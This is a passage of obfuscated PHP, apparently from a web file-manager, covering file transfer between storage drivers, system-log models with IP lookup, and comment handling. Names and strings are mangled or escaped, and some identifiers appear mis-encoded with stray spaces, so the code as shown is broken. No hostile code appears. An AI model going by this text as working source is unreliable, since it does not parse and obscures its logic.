$Š¨•˜êÂ = LNG($æ¥ïÆ“Æ == $Ï‡åÑ£«[548] ? $Ï‡åÑ£«[2182] : $Ï‡åÑ£«[2183]); $Õ°ì¹Ş = new TaskFileTransfer($†®É™áî, $Ï‡åÑ£«[2177], $¢ßŞ„‡³, $Š¨•˜êÂ . "\50{$şÅæ¡–°}\51"); $Õ°ì¹Ş->task[$Ï‡åÑ£«[760]] = (double) $ÍÓå¾”Ö; $‡‚ôß×ñ = KodIO::defaultDriver(); $í²Æ¦˜“ = $‡‚ôß×ñ[$Ï‡åÑ£«[399]]; $•š¡¹¦” = "\173\x69\x6f\x3a{$í²Æ¦˜“}\175\57"; $²Íºá§Ñ = !0; $íµ ‘É¡ = array(); $†õ“â— = Model($Ï‡åÑ£«[200])->where($ã¸ŞşÏ¡)->field($Ï‡åÑ£«[2184])->select(); foreach ($†õ“â— as $ğ£Š±åä) { $Ò·ÊíÎ¬ = $ğ£Š±åä[$Ï‡åÑ£«[84]]; $­ÕÂÇí = $•š¡¹¦” . str_replace("\173\x69\x6f\x3a{$şÅæ¡–°}\175\57", $Ï‡åÑ£«[12], $Ò·ÊíÎ¬); if (!IO::exist($Ò·ÊíÎ¬)) { $íµ ‘É¡[] = $ğ£Š±åä[$Ï‡åÑ£«[468]]; $Õ°ì¹Ş->updateFileEnd($ğ£Š±åä[$Ï‡åÑ£«[32]], $ğ£Š±åä[$Ï‡åÑ£«[76]]); continue; } if (IO::exist($­ÕÂÇí)) { $Õ°ì¹Ş->updateFileEnd($ğ£Š±åä[$Ï‡åÑ£«[32]], $ğ£Š±åä[$Ï‡åÑ£«[76]]); continue; } if (!IO::move($Ò·ÊíÎ¬, get_path_father($­ÕÂÇí))) { $²Íºá§Ñ = !1; break; } $ã¸ŞşÏ¡ = array($Ï‡åÑ£«[468] => $ğ£Š±åä[$Ï‡åÑ£«[468]]); $ôÎÊ‘˜’ = array($Ï‡åÑ£«[814] => $í²Æ¦˜“, $Ï‡åÑ£«[84] => $­ÕÂÇí); Model($Ï‡åÑ£«[200])->where($ã¸ŞşÏ¡)->save($ôÎÊ‘˜’); } $this->removeByFileID($íµ ‘É¡); if (!$²Íºá§Ñ) { $Õ°ì¹Ş->stop($†®É™áî); return !1; } $Õ°ì¹Ş->end(); if ($æ¥ïÆ“Æ == $Ï‡åÑ£«[1821]) { $this->remove($şÅæ¡–°); } } public function progress($ó—Ô¯ú, $Ï£¨‚Ú) { return Task::get($Ï£¨‚Ú . $_SERVER[­á Ş³Ö][2181] . $ó—Ô¯ú); } private function removeByFileID($æ½«ê” = array()) { $ÌÁ˜àÆÚ =& $_SERVER[­á Ş³Ö]; if (empty($æ½«ê”)) { return; } $¢ğïÒ“ş = array($ÌÁ˜àÆÚ[468] => array($ÌÁ˜àÆÚ[7], $æ½«ê”)); $˜îÂºªÄ = Model($ÌÁ˜àÆÚ[1335])->where($¢ğïÒ“ş)->field($ÌÁ˜àÆÚ[402])->select(); if (!$˜îÂºªÄ) { return; } $˜îÂºªÄ = array_to_keyvalue($˜îÂºªÄ, $ÌÁ˜àÆÚ[12], $ÌÁ˜àÆÚ[402]); foreach ($˜îÂºªÄ as $ÒÇˆ†ê…) { Model($ÌÁ˜àÆÚ[416])->removeNow($ÒÇˆ†ê…, !1); } } private function removeShareItems($©Æ§£Ô¦) { $’»úŠñ© =& $_SERVER[­á Ş³Ö]; $ÀäìïÒ = "\x7b\151\157\72{$©Æ§£Ô¦}\175\57"; $½‹®âÔ„ = array($’»úŠñ©[402] => 0, $’»úŠñ©[1171] => array($’»úŠñ©[383], "{$ÀäìïÒ}\x25")); $íØÇ†¬ç = Model($’»úŠñ©[1832])->where($½‹®âÔ„)->field($’»úŠñ©[593])->select(); if (empty($íØÇ†¬ç)) { return; } $Ï»§¨áô = array_to_keyvalue($íØÇ†¬ç, $’»úŠñ©[12], $’»úŠñ©[593]); Model($’»úŠñ©[592])->remove($Ï»§¨áô); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\x4c\x69\x67\150\164\101\x70\160"; public $modelType = "\x53\x79\x73\x74\145\155\117\160\x74\151\x6f\156"; public $field = array("\156\141\x6d\x65", "\x67\162\x6f\x75\x70", "\x64\x65\163\143", "\x63\x6f\x6e\x74\x65\156\x74"); public function listData($—œå·“î = false, $å¿úÎÙÔ = "\155\157\144\x69\146\x79\124\x69\x6d\145", $¸Ê¼âÓÃ = true) { return parent::listData($—œå·“î, $å¿úÎÙÔ, $¸Ê¼âÓÃ); } public function remove($ü»ÛêÈÉ) { $ö¯Øá‡” = $this->findByName($ü»ÛêÈÉ); if (!$ö¯Øá‡”) { return !1; } return parent::remove($ö¯Øá‡”[$_SERVER[­á Ş³Ö][399]]); } public function add($”Áñ‹™¬) { if ($this->findByName($”Áñ‹™¬[$_SERVER[­á Ş³Ö][32]])) { return !1; } return parent::insert($”Áñ‹™¬); } public function update($Ö¼ôâ°ƒ, $Şû—ÅİÌ) { $ï™ê… =& $_SERVER[­á Ş³Ö]; $›“’²Áä = $this->findByName($Ö¼ôâ°ƒ); $µÛ†ì¡ = $this->findByName($Şû—ÅİÌ[$ï™ê…[32]]); if (!$›“’²Áä || $µÛ†ì¡ && $µÛ†ì¡[$ï™ê…[399]] != $›“’²Áä[$ï™ê…[399]]) { return !1; } return parent::update($›“’²Áä[$ï™ê…[399]], $Şû—ÅİÌ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\164\x65\155\137\154\157\147"; protected $dataAuto = array(array("\x63\162\145\141\x74\145\x54\x69\x6d\145", "\164\x69\155\x65", "\151\156\163\x65\162\x74", "\x66\165\156\x63\x74\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Ö¼ÄÓ’ =& $_SERVER[­á Ş³Ö]; return array($Ö¼ÄÓ’[2185] => LNG($Ö¼ÄÓ’[2186]), $Ö¼ÄÓ’[2187] => LNG($Ö¼ÄÓ’[2188]), $Ö¼ÄÓ’[1795] => LNG($Ö¼ÄÓ’[2189]), $Ö¼ÄÓ’[2190] => LNG($Ö¼ÄÓ’[2191]), $Ö¼ÄÓ’[2192] => LNG($Ö¼ÄÓ’[2193]), $Ö¼ÄÓ’[2194] => LNG($Ö¼ÄÓ’[2195]), $Ö¼ÄÓ’[2196] => LNG($Ö¼ÄÓ’[2197]), $Ö¼ÄÓ’[1825] => LNG($Ö¼ÄÓ’[2197]), $Ö¼ÄÓ’[1826] => LNG($Ö¼ÄÓ’[2198]), $Ö¼ÄÓ’[2199] => LNG($Ö¼ÄÓ’[2200]), $Ö¼ÄÓ’[2201] => LNG($Ö¼ÄÓ’[2202]), $Ö¼ÄÓ’[2203] => LNG($Ö¼ÄÓ’[2204]), $Ö¼ÄÓ’[2205] => LNG($Ö¼ÄÓ’[2206]), $Ö¼ÄÓ’[1823] => LNG($Ö¼ÄÓ’[2207]), $Ö¼ÄÓ’[2208] => LNG($Ö¼ÄÓ’[2209]), $Ö¼ÄÓ’[1830] => LNG($Ö¼ÄÓ’[2210]), $Ö¼ÄÓ’[2211] => LNG($Ö¼ÄÓ’[2212]), $Ö¼ÄÓ’[2213] => LNG($Ö¼ÄÓ’[2214]), $Ö¼ÄÓ’[2215] => LNG($Ö¼ÄÓ’[2216]), $Ö¼ÄÓ’[2217] => LNG($Ö¼ÄÓ’[2218]), $Ö¼ÄÓ’[1833] => LNG($Ö¼ÄÓ’[2219]), $Ö¼ÄÓ’[1834] => LNG($Ö¼ÄÓ’[2220]), $Ö¼ÄÓ’[2221] => LNG($Ö¼ÄÓ’[2222]), $Ö¼ÄÓ’[2223] => LNG($Ö¼ÄÓ’[2224]), $Ö¼ÄÓ’[2225] => LNG($Ö¼ÄÓ’[2226]), $Ö¼ÄÓ’[1828] => LNG($Ö¼ÄÓ’[2227]), $Ö¼ÄÓ’[2228] => LNG($Ö¼ÄÓ’[2229]), $Ö¼ÄÓ’[1827] => LNG($Ö¼ÄÓ’[2230]), $Ö¼ÄÓ’[2231] => LNG($Ö¼ÄÓ’[2232]), $Ö¼ÄÓ’[2233] => LNG($Ö¼ÄÓ’[2234]), $Ö¼ÄÓ’[2235] => LNG($Ö¼ÄÓ’[2236]), $Ö¼ÄÓ’[2237] => LNG($Ö¼ÄÓ’[2237]), $Ö¼ÄÓ’[2238] => LNG($Ö¼ÄÓ’[1799]), $Ö¼ÄÓ’[2239] => LNG($Ö¼ÄÓ’[2240]), $Ö¼ÄÓ’[2241] => LNG($Ö¼ÄÓ’[2242]), $Ö¼ÄÓ’[2243] => LNG($Ö¼ÄÓ’[2244]), $Ö¼ÄÓ’[2245] => LNG($Ö¼ÄÓ’[2246]), $Ö¼ÄÓ’[2247] => LNG($Ö¼ÄÓ’[2248]), $Ö¼ÄÓ’[2249] => LNG($Ö¼ÄÓ’[2249]), $Ö¼ÄÓ’[2250] => LNG($Ö¼ÄÓ’[2251]), $Ö¼ÄÓ’[2252] => LNG($Ö¼ÄÓ’[2253]), $Ö¼ÄÓ’[2254] => LNG($Ö¼ÄÓ’[2255]), $Ö¼ÄÓ’[2256] => LNG($Ö¼ÄÓ’[2257]), $Ö¼ÄÓ’[2258] => LNG($Ö¼ÄÓ’[2259]), $Ö¼ÄÓ’[2260] => LNG($Ö¼ÄÓ’[2261])); } private function typeFile() { $ØŠƒ–Æ¥ =& $_SERVER[­á Ş³Ö]; $Á­´¦à­ = array($ØŠƒ–Æ¥[1830] => array($ØŠƒ–Æ¥[1831]), $ØŠƒ–Æ¥[2203] => array($ØŠƒ–Æ¥[2262]), $ØŠƒ–Æ¥[2205] => array($ØŠƒ–Æ¥[2263]), $ØŠƒ–Æ¥[1823] => array($ØŠƒ–Æ¥[1824]), $ØŠƒ–Æ¥[2213] => array(), $ØŠƒ–Æ¥[2215] => array(), $ØŠƒ–Æ¥[2217] => array(), $ØŠƒ–Æ¥[1833] => array($ØŠƒ–Æ¥[1835]), $ØŠƒ–Æ¥[1834] => array($ØŠƒ–Æ¥[1835]), $ØŠƒ–Æ¥[2221] => array($ØŠƒ–Æ¥[2264]), $ØŠƒ–Æ¥[2223] => array($ØŠƒ–Æ¥[2264]), $ØŠƒ–Æ¥[2225] => array($ØŠƒ–Æ¥[2265]), $ØŠƒ–Æ¥[2211] => array($ØŠƒ–Æ¥[2266]), $ØŠƒ–Æ¥[1828] => array($ØŠƒ–Æ¥[2267]), $ØŠƒ–Æ¥[2228] => array($ØŠƒ–Æ¥[2268]), $ØŠƒ–Æ¥[1827] => array($ØŠƒ–Æ¥[1829])); return $Á­´¦à­; } private function typeAll() { $ìÇŸĞ¨± =& $_SERVER[­á Ş³Ö]; $Ì¨³Óçø = $this->typeList; $üœ˜´Â = array_filter($this->typeFile()); foreach ($üœ˜´Â as $—ÀŒƒ => $Â‡Ã¯õ±) { $Ì¨³Óçø[$Â‡Ã¯õ±[0]] = $Ì¨³Óçø[$—ÀŒƒ]; } $Ì¨³Óçø[$ìÇŸĞ¨±[1835]] = LNG($ìÇŸĞ¨±[2269]); $Ì¨³Óçø[$ìÇŸĞ¨±[2264]] = LNG($ìÇŸĞ¨±[2270]); return $Ì¨³Óçø; } public function addLog($¾òšßÃ, $ÓŞµŸÖ× = array()) { $õ¹›²‚Ğ =& $_SERVER[­á Ş³Ö]; if (!isset($this->typeList[$¾òšßÃ])) { return; } $·â£Ûûù = USER_ID ? USER_ID : (isset($ÓŞµŸÖ×[$õ¹›²‚Ğ[1663]]) ? $ÓŞµŸÖ×[$õ¹›²‚Ğ[1663]] : 0); if (!$·â£Ûûù) { $·â£Ûûù = (int) Session::get($õ¹›²‚Ğ[1989]); } if ($¾òšßÃ == $õ¹›²‚Ğ[2239] && is_array($ÓŞµŸÖ×[$õ¹›²‚Ğ[2271]]) && !$ÓŞµŸÖ×[$õ¹›²‚Ğ[2271]]) { return; } $â„ôÕ¹Œ = get_client_ip(); if (!$ÓŞµŸÖ× || strlen(json_encode($ÓŞµŸÖ×)) >= 1024) { $ÓŞµŸÖ× = array($õ¹›²‚Ğ[2272] => $â„ôÕ¹Œ); } else { if (is_array($ÓŞµŸÖ×)) { $ÓŞµŸÖ×[$õ¹›²‚Ğ[2272]] = $â„ôÕ¹Œ; } else { $ÓŞµŸÖ× = array($õ¹›²‚Ğ[1198] => $ÓŞµŸÖ×, $õ¹›²‚Ğ[2272] => $â„ôÕ¹Œ); } } $ÓŞµŸÖ× = array($õ¹›²‚Ğ[1653] => Session::sign(), $õ¹›²‚Ğ[1654] => $·â£Ûûù, $õ¹›²‚Ğ[33] => $¾òšßÃ, $õ¹›²‚Ğ[1656] => json_encode($ÓŞµŸÖ×)); parent::add($ÓŞµŸÖ×); } public function remove($ˆ¶¢¾Ã) { $this->where(array($_SERVER[­á Ş³Ö][419] => $ˆ¶¢¾Ã))->delete(); } private function _makeOrder($ÎùŸ¸ï = '') { $æöğûÖÀ =& $_SERVER[­á Ş³Ö]; $·˜ˆ¨– = $æöğûÖÀ[201]; $Ï×âĞ· = array($æöğûÖÀ[450] => $æöğûÖÀ[451], $æöğûÖÀ[452] => $æöğûÖÀ[453]); $…ùŒøÑ¾ = Input::get($æöğûÖÀ[458], $æöğûÖÀ[7], $æöğûÖÀ[2025], array($æöğûÖÀ[1943], $æöğûÖÀ[452])); $…ùŒøÑ¾ = $Ï×âĞ·[$…ùŒøÑ¾]; $ÎùŸ¸ï = $ÎùŸ¸ï . "{$·˜ˆ¨–}\x20{$…ùŒøÑ¾}"; return $this->order($ÎùŸ¸ï); } public function get($ÅıÄ¯ä˜ = '') { $¡‚ããˆÎ =& $_SERVER[­á Ş³Ö]; if (!$ÅıÄ¯ä˜) { show_json(array()); } $ÉœäúÂè = array(); if ($ÅıÄ¯ä˜[$¡‚ããˆÎ[1663]]) { $ÉœäúÂè[$¡‚ããˆÎ[1663]] = $ÅıÄ¯ä˜[$¡‚ããˆÎ[1663]]; } if (isset($ÅıÄ¯ä˜[$¡‚ããˆÎ[757]])) { $’Í€â·Æ = $ÅıÄ¯ä˜[$¡‚ããˆÎ[757]]; $š ¤ÏåÊ = isset($ÅıÄ¯ä˜[$¡‚ããˆÎ[758]]) ? $ÅıÄ¯ä˜[$¡‚ããˆÎ[758]] : time(); $ÉœäúÂè[$¡‚ããˆÎ[201]] = array($¡‚ããˆÎ[333], array($’Í€â·Æ, $š ¤ÏåÊ)); } if ($ÅıÄ¯ä˜[$¡‚ããˆÎ[33]]) { $ÅíÁ­« = explode($¡‚ããˆÎ[50], $ÅıÄ¯ä˜[$¡‚ããˆÎ[33]]); $­†Íä­’ = $this->typeFile(); $à´¿‰Ãê = array(); foreach ($ÅíÁ­« as $›¾„””) { $à´¿‰Ãê[] = $›¾„””; if (isset($­†Íä­’[$›¾„””])) { $à´¿‰Ãê = array_merge($à´¿‰Ãê, $­†Íä­’[$›¾„””]); } } $à´¿‰Ãê = array_unique($à´¿‰Ãê); if ($à´¿‰Ãê) { $ÉœäúÂè[$¡‚ããˆÎ[33]] = array($¡‚ããˆÎ[7], $à´¿‰Ãê); } } else { $ÉœäúÂè[$¡‚ããˆÎ[33]] = array($¡‚ããˆÎ[2273], $¡‚ããˆÎ[2274]); } if (!empty($ÅıÄ¯ä˜[$¡‚ããˆÎ[2272]])) { $ÉœäúÂè[$¡‚ããˆÎ[453]] = array($¡‚ããˆÎ[383], "\45{$ÅıÄ¯ä˜[$¡‚ããˆÎ[2272]]}\x25"); } $ôßæôÌ = $this->_makeOrder()->where($ÉœäúÂè)->selectPage(); if (empty($ôßæôÌ[$¡‚ããˆÎ[369]])) { show_json(array(), !0, $ôßæôÌ[$¡‚ããˆÎ[366]]); } $ôßæôÌ[$¡‚ããˆÎ[369]] = $this->logList($ôßæôÌ[$¡‚ããˆÎ[369]]); return $ôßæôÌ; } private function ipAddress(&$î§ı°ıı) { $ÖÑÓóêÄ =& $_SERVER[­á Ş³Ö]; if (!empty($î§ı°ıı[$ÖÑÓóêÄ[2272]])) { $Œ‚ğ¢‹Å = IpLocation::get($î§ı°ıı[$ÖÑÓóêÄ[2272]]); } else { $Œ‚ğ¢‹Å = LNG($ÖÑÓóêÄ[2275]); } $î§ı°ıı[$ÖÑÓóêÄ[2276]] = $Œ‚ğ¢‹Å; } private function descZipDownload($™õöúæ, &$‘æè¶ä“) { $İª„Õˆµ =& $_SERVER[­á Ş³Ö]; if (!isset($™õöúæ[$İª„Õˆµ[2277]])) { return; } $Ååì¦† = json_decode($™õöúæ[$İª„Õˆµ[2277]], !0); foreach ($Ååì¦† as $€¸¨£¬÷) { try { $‘ŠùÚşÇ = IO::infoFull($€¸¨£¬÷[$İª„Õˆµ[84]]); } catch (Exception $ô×ÜÁŒ) { continue; } $™õöúæ[$İª„Õˆµ[84]] = $€¸¨£¬÷[$İª„Õˆµ[84]]; $‘æè¶ä“[] = $™õöúæ[$İª„Õˆµ[402]] = $‘ŠùÚşÇ[$İª„Õˆµ[402]]; $‘æè¶ä“[] = $™õöúæ[$İª„Õˆµ[2079]] = $‘ŠùÚşÇ[$İª„Õˆµ[432]]; break; } return $™õöúæ; } private function getSourceList(&$‹©é½¸½) { $éõ‡éæ =& $_SERVER[­á Ş³Ö]; $×­€ø—‹ = array(); foreach ($‹©é½¸½ as $ÚÑéÌ›« => $åÇ‰åİÁ) { $¾œâİÏ = json_decode($åÇ‰åİÁ[$éõ‡éæ[453]], !0); if ($åÇ‰åİÁ[$éõ‡éæ[33]] == $éõ‡éæ[1826]) { $¾œâİÏ = $this->descZipDownload($¾œâİÏ, $×­€ø—‹); $‹©é½¸½[$ÚÑéÌ›«][$éõ‡éæ[453]] = json_encode($¾œâİÏ); continue; } if (strpos($åÇ‰åİÁ[$éõ‡éæ[33]], $éõ‡éæ[2081]) !== 0) { if (!isset($¾œâİÏ[$éõ‡éæ[84]]) || strpos($åÇ‰åİÁ[$éõ‡éæ[33]], $éõ‡éæ[2278]) !== 0) { continue; } try { $Ñ„¨İ˜ë = IO::infoFull($¾œâİÏ[$éõ‡éæ[84]]); } catch (Exception $ÃÉ†‘‡ü) { continue; } $×­€ø—‹[] = $¾œâİÏ[$éõ‡éæ[402]] = $Ñ„¨İ˜ë[$éõ‡éæ[402]]; $×­€ø—‹[] = $¾œâİÏ[$éõ‡éæ[2079]] = $Ñ„¨İ˜ë[$éõ‡éæ[432]]; $‹©é½¸½[$ÚÑéÌ›«][$éõ‡éæ[453]] = json_encode($¾œâİÏ); continue; } $×­€ø—‹[] = $¾œâİÏ[$éõ‡éæ[402]]; $×­€ø—‹[] = $¾œâİÏ[$éõ‡éæ[2079]]; if ($¾œâİÏ[$éõ‡éæ[33]] == $éõ‡éæ[548]) { $×­€ø—‹[] = $¾œâİÏ[$éõ‡éæ[453]][$éõ‡éæ[1156]]; $×­€ø—‹[] = $¾œâİÏ[$éõ‡éæ[453]][$éõ‡éæ[1157]]; } if ($¾œâİÏ[$éõ‡éæ[33]] == $éõ‡éæ[2089]) { $×­€ø—‹[] = $¾œâİÏ[$éõ‡éæ[453]][$éõ‡éæ[402]]; } } if (!$×­€ø—‹) { return array(); } return Model($éõ‡éæ[822])->sourceListInfo($×­€ø—‹, !0); } private function logList($ß…ËÂàş) { $·Ô©†‰ğ =& $_SERVER[­á Ş³Ö]; $º–÷Ô²¦ = array_to_keyvalue($ß…ËÂàş, $·Ô©†‰ğ[12], $·Ô©†‰ğ[1663]); $Ïşå¢å = Model($·Ô©†‰ğ[525])->userListInfo(array_unique($º–÷Ô²¦)); $Ÿ•†¾ = $this->getSourceList($ß…ËÂàş); $œöŠã·¿ = $this->typeAll(); $º‰ëÕÈÌ = array(); $Ó…Ò…› = array(); foreach ($ß…ËÂàş as $å¯ÈÀ¯È => $ùÔ¥ğûò) { $ˆ´‡ÉÉ¯ = $ùÔ¥ğûò[$·Ô©†‰ğ[33]]; $…¯øÀÌ² = isset($Ïşå¢å[$ùÔ¥ğûò[$·Ô©†‰ğ[1663]]]) ? $Ïşå¢å[$ùÔ¥ğûò[$·Ô©†‰ğ[1663]]] : !1; $ú¡¼Íµ’ = strpos($ˆ´‡ÉÉ¯, $·Ô©†‰ğ[2279]) === 0 ? LNG($·Ô©†‰ğ[2280]) : LNG($·Ô©†‰ğ[2275]); $ùÔ¥ğûò[$·Ô©†‰ğ[32]] = isset($…¯øÀÌ²[$·Ô©†‰ğ[32]]) ? $…¯øÀÌ²[$·Ô©†‰ğ[32]] : LNG($·Ô©†‰ğ[2275]); $ùÔ¥ğûò[$·Ô©†‰ğ[532]] = isset($…¯øÀÌ²[$·Ô©†‰ğ[532]]) ? $…¯øÀÌ²[$·Ô©†‰ğ[532]] : $·Ô©†‰ğ[12]; $ùÔ¥ğûò[$·Ô©†‰ğ[1561]] = isset($œöŠã·¿[$ˆ´‡ÉÉ¯]) ? $œöŠã·¿[$ˆ´‡ÉÉ¯] : $ú¡¼Íµ’; $ùÔ¥ğûò[$·Ô©†‰ğ[2024]] = $…¯øÀÌ²; $ª®¿ˆÆ½ = json_decode($ùÔ¥ğûò[$·Ô©†‰ğ[453]], !0); $ùÔ¥ğûò[$·Ô©†‰ğ[2272]] = isset($ª®¿ˆÆ½[$·Ô©†‰ğ[2272]]) ? $ª®¿ˆÆ½[$·Ô©†‰ğ[2272]] : $·Ô©†‰ğ[12]; $ùÔ¥ğûò[$·Ô©†‰ğ[2276]] = IpLocation::get($ùÔ¥ğûò[$·Ô©†‰ğ[2272]]); if (strpos($ˆ´‡ÉÉ¯, $·Ô©†‰ğ[2081]) === 0 || isset($ª®¿ˆÆ½[$·Ô©†‰ğ[2079]])) { $ª®¿ˆÆ½[$·Ô©†‰ğ[87]] = $Ÿ•†¾[$ª®¿ˆÆ½[$·Ô©†‰ğ[402]]]; $ª®¿ˆÆ½[$·Ô©†‰ğ[2094]] = $Ÿ•†¾[$ª®¿ˆÆ½[$·Ô©†‰ğ[2079]]]; if ($ª®¿ˆÆ½[$·Ô©†‰ğ[33]] == $·Ô©†‰ğ[548]) { $ª®¿ˆÆ½[$·Ô©†‰ğ[453]][$·Ô©†‰ğ[1156]] = $Ÿ•†¾[$ª®¿ˆÆ½[$·Ô©†‰ğ[453]][$·Ô©†‰ğ[1156]]]; $ª®¿ˆÆ½[$·Ô©†‰ğ[453]][$·Ô©†‰ğ[1157]] = $Ÿ•†¾[$ª®¿ˆÆ½[$·Ô©†‰ğ[453]][$·Ô©†‰ğ[1157]]]; } if ($ª®¿ˆÆ½[$·Ô©†‰ğ[33]] == $·Ô©†‰ğ[2089]) { $ª®¿ˆÆ½[$·Ô©†‰ğ[453]][$·Ô©†‰ğ[402]] = $Ÿ•†¾[$ª®¿ˆÆ½[$·Ô©†‰ğ[453]][$·Ô©†‰ğ[402]]]; } if ($ª®¿ˆÆ½[$·Ô©†‰ğ[33]] == $·Ô©†‰ğ[1821]) { $ª®¿ˆÆ½[$·Ô©†‰ğ[2094]] = $ª®¿ˆÆ½[$·Ô©†‰ğ[87]]; $ª®¿ˆÆ½[$·Ô©†‰ğ[2079]] = $ª®¿ˆÆ½[$·Ô©†‰ğ[2094]][$·Ô©†‰ğ[402]]; $ª®¿ˆÆ½[$·Ô©†‰ğ[87]] = !1; $ª®¿ˆÆ½[$·Ô©†‰ğ[402]] = $·Ô©†‰ğ[12]; } if ($ª®¿ˆÆ½[$·Ô©†‰ğ[87]] && $ª®¿ˆÆ½[$·Ô©†‰ğ[87]][$·Ô©†‰ğ[411]] == $·Ô©†‰ğ[1280]) { $Ó…Ò…›[] = $ùÔ¥ğûò[$·Ô©†‰ğ[399]]; unset($ß…ËÂàş[$å¯ÈÀ¯È]); continue; } if ($ª®¿ˆÆ½[$·Ô©†‰ğ[2094]] && $ª®¿ˆÆ½[$·Ô©†‰ğ[2094]][$·Ô©†‰ğ[411]] == $·Ô©†‰ğ[1280]) { $Ó…Ò…›[] = $ùÔ¥ğûò[$·Ô©†‰ğ[399]]; unset($ß…ËÂàş[$å¯ÈÀ¯È]); continue; } } $ùÔ¥ğûò[$·Ô©†‰ğ[453]] = $ª®¿ˆÆ½; unset($ùÔ¥ğûò[$·Ô©†‰ğ[2281]]); $º‰ëÕÈÌ[] = $ùÔ¥ğûò; } $this->clearSystemPathLog($Ó…Ò…›); return $º‰ëÕÈÌ; } private function clearSystemPathLog($Öó´şÛš) { $ñ¨Œìë™ =& $_SERVER[­á Ş³Ö]; if (count($Öó´şÛš) == 0) { return; } $ÅÒµÇşï = array($ñ¨Œìë™[399] => array($ñ¨Œìë™[7], array_unique($Öó´şÛš))); $this->where($ÅÒµÇşï)->delete(); } public function deviceList($•ÑøÙ», $Ó«ÇÇèå = 0) { $óœèŠã™ =& $_SERVER[­á Ş³Ö]; $‹şç„Öì = array($óœèŠã™[1663] => $•ÑøÙ», $óœèŠã™[201] => array($óœèŠã™[1010], $Ó«ÇÇèå), $óœèŠã™[33] => $óœèŠã™[1795]); $†²‹ì£˜ = array(); $¶­­…Øä = $this->field($óœèŠã™[2282])->where($‹şç„Öì)->order($óœèŠã™[2092])->limit(50)->select(); foreach ($¶­­…Øä as $ÛîÖ€¶ => $‹øÜ¹‹Ÿ) { if ($ÛîÖ€¶ > 0 && abs($‹øÜ¹‹Ÿ[$óœèŠã™[201]] - $¶­­…Øä[$ÛîÖ€¶ - 1][$óœèŠã™[201]]) < 5) { continue; } $Œä²¯Å‘ = json_decode($‹øÜ¹‹Ÿ[$óœèŠã™[453]], !0); $‹øÜ¹‹Ÿ[$óœèŠã™[2272]] = isset($Œä²¯Å‘[$óœèŠã™[2272]]) ? $Œä²¯Å‘[$óœèŠã™[2272]] : $óœèŠã™[12]; unset($Œä²¯Å‘[$óœèŠã™[2272]]); $àöÂƒæ¯ = $this->deviceType($Œä²¯Å‘[$óœèŠã™[2082]]); if (isset($†²‹ì£˜[$àöÂƒæ¯])) { continue; } $‹øÜ¹‹Ÿ[$óœèŠã™[2276]] = IpLocation::get($‹øÜ¹‹Ÿ[$óœèŠã™[2272]]); $‹øÜ¹‹Ÿ[$óœèŠã™[453]] = $Œä²¯Å‘; $†²‹ì£˜[$àöÂƒæ¯] = $‹øÜ¹‹Ÿ; } return array_values($†²‹ì£˜); } public function deviceType($ößÏˆ…) { return $ößÏˆ…; } } goto aÙôÌØîÄ; dƒÃàÑ‹¢…: class CommentModel extends ModelBase { protected $tableName = "\143\x6f\155\155\x65\x6e\x74"; protected $tableMeta = array("\164\x61\x62\x6c\145\116\x61\155\x65" => "\x63\x6f\155\155\x65\156\x74\x5f\x6d\145\164\x61", "\155\x65\164\x61\106\x69\x65\154\144" => "\143\157\x6d\x6d\145\156\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ö®ÛĞŸ¦) { $¢¼¡„‹† =& $_SERVER[­á Ş³Ö]; if ($ö®ÛĞŸ¦[$¢¼¡„‹†[1881]]) { $ÃãåŒü† = $this->where(array($¢¼¡„‹†[1882] => $ö®ÛĞŸ¦[$¢¼¡„‹†[1881]]))->find(); if (!$ÃãåŒü† || $ÃãåŒü†[$¢¼¡„‹†[411]] != $ö®ÛĞŸ¦[$¢¼¡„‹†[411]] || $ÃãåŒü†[$¢¼¡„‹†[496]] != $ö®ÛĞŸ¦[$¢¼¡„‹†[496]]) { return !1; } $this->where(array($¢¼¡„‹†[1882] => $ö®ÛĞŸ¦[$¢¼¡„‹†[1881]]))->setAdd($¢¼¡„‹†[1883], 1); } $ö®ÛĞŸ¦[$¢¼¡„‹†[1884]] = 0; $ö®ÛĞŸ¦[$¢¼¡„‹†[1883]] = 0; $ö®ÛĞŸ¦[$¢¼¡„‹†[746]] = 1; return $this->add($ö®ÛĞŸ¦); } public function commentCount($ØŒÙ÷ÎÀ, $„²ò¦š„, $ÁóÄî = false) { $´×è–² =& $_SERVER[­á Ş³Ö]; if (!$ØŒÙ÷ÎÀ) { return array(); } if (is_string($ØŒÙ÷ÎÀ) || is_int($ØŒÙ÷ÎÀ)) { $ØŒÙ÷ÎÀ = array($ØŒÙ÷ÎÀ); } $æÔ±¶ıÏ = array($´×è–²[496], $´×è–²[1885] => $´×è–²[491]); $¡´Í¨á… = array($´×è–²[496] => array($´×è–²[7], $ØŒÙ÷ÎÀ), $´×è–²[411] => $„²ò¦š„); if ($ÁóÄî) { $¡´Í¨á…[$´×è–²[1663]] = $ÁóÄî; } $ÙîØœúİ = $this->field($æÔ±¶ıÏ)->where($¡´Í¨á…)->group($´×è–²[496])->select(); return array_to_keyvalue($ÙîØœúİ, $´×è–²[496], $´×è–²[491]); } public function starTarget($èÂ‹¶ıÓ, $Ïòù—Õ) { $¨°çğœÚ =& $_SERVER[­á Ş³Ö]; $ÄÖö„ÙÄ = $èÂ‹¶ıÓ + self::TYPE_STAR_OFFSET; $©»¼ú»• = array($¨°çğœÚ[1663] => USER_ID, $¨°çğœÚ[411] => $ÄÖö„ÙÄ, $¨°çğœÚ[496] => $Ïòù—Õ); $ä¯×ñú = $this->where($©»¼ú»•)->find(); if ($ä¯×ñú) { return $this->where(array($¨°çğœÚ[399] => $ä¯×ñú[$¨°çğœÚ[399]]))->delete(); } $Œ»’Õ¨ = array($¨°çğœÚ[1881] => 0, $¨°çğœÚ[1663] => USER_ID, $¨°çğœÚ[746] => 1, $¨°çğœÚ[751] => $¨°çğœÚ[12], $¨°çğœÚ[411] => $ÄÖö„ÙÄ, $¨°çğœÚ[496] => $Ïòù—Õ, $¨°çğœÚ[1884] => 0, $¨°çğœÚ[1883] => 0); return 